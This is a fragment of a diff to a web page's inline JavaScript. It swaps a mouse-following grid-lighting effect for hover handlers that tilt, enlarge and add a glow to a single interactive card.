-        // Dynamic grid lighting
-        const gridBackdrop = document.querySelector('.grid-backdrop');
-        document.addEventListener('mousemove', (e) => {
-            const x = (e.clientX / window.innerWidth) * 100;
-            const y = (e.clientY / window.innerHeight) * 100;
-            gridBackdrop.style.backgroundImage = `
-                repeating-linear-gradient(90deg, rgba(200,30,50,0.4) 0px, rgba(200,30,50,0.4) 1.5px, transparent 1.5px, transparent 45px),
-                repeating-linear-gradient(0deg, rgba(200,30,50,0.4) 0px, rgba(200,30,50,0.4) 1.5px, transparent 1.5px, transparent 45px),
-                radial-gradient(circle at ${x}% ${y}%, rgba(130,0,0,0.7), rgba(0,0,0,0.95))
-            `;
-        });
-
-        updateUI();
+      }
+      
+      let cardMatchesHover = false;
+      
+      function onMouseEnterCard() {
+        cardMatchesHover = true;
+        card.style.transition = 'transform 0.12s ease-out';
+        // slight enhancement: border glow
+        card.style.borderColor = '#9affb0';
+        // start listening to mousemove globally for tilt relative to card
+        window.addEventListener('mousemove', handleCardTilt);
+        // trigger initial tilt based on current mouse position
+        if (window.lastMouseEvent) {
+          handleCardTilt(window.lastMouseEvent);
+        } else {
+          // fallback default scaling
+          card.style.transform = 'perspective(1200px) scale(1.05) rotateX(0deg) rotateY(0deg)';
+        }
+      }
+      
+      function onMouseLeaveCard() {
+        cardMatchesHover = false;
+        window.removeEventListener('mousemove', handleCardTilt);
+        card.style.transform = '';
+        card.style.transition = 'transform 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1)';
+        card.style.borderColor = '';
+        // reset any inline style after transition
+        setTimeout(() => {
+          if (!cardMatchesHover) {
+            card.style.transform = '';
+          }
+        }, 200);
+      }
+      
+      // store last mouse event for immediate tilt
+      window.addEventListener('mousemove', (e) => {
+        window.lastMouseEvent = e;
+      });
+      
+      card.addEventListener('mouseenter', onMouseEnterCard);
+      card.addEventListener('mouseleave', onMouseLeaveCard);
+      
+      // additional micro effect: ensure card container doesn't cause unintended interference
+      container.addEventListener('mouseenter', () => {});
+      
+      // also ensure that if mouse moves quickly while over card, tilt updates smoothly.
+      // our handleCardTilt uses latest coords, fine.
+      
+      // small extra: add a subtle shadow intensity change during hover via CSS
+      const style = document.createElement('style');
+      style.textContent = `
+        .interactive-card:hover {
+          box-shadow: 0 35px 55px -18px black, 0 0 0 2px rgba(100,255,140,0.8) inset, 0 0 38px #3eff8a !important;
+          border-color: #b4ffc0;
+        }
+      `;
+      document.head.appendChild(style);
+      
+      // pre-set transition on card for smoothness
+      card.style.transition = 'transform 0.2s ease-out, box-shadow 0.2s, border-color 0.2s';
+      
+      // remove any leftover carousel elements - ensure only one card
+      // also remove subhead/button etc from content - we've already removed them in HTML
+      // final step: ensure no old interactive elements remain.
+      
+      // optional hover instruction subtlety
+      console.log('Single interactive card ready — tilts toward mouse & enlarges on hover');
+      
+      // Bonus: to make particles and spot theme more lively, add slight rotation to floating dots container on mousemove over card?
+      // not needed, already cool.
     })();
-</script>
+  </script>
 </body>
 </html>
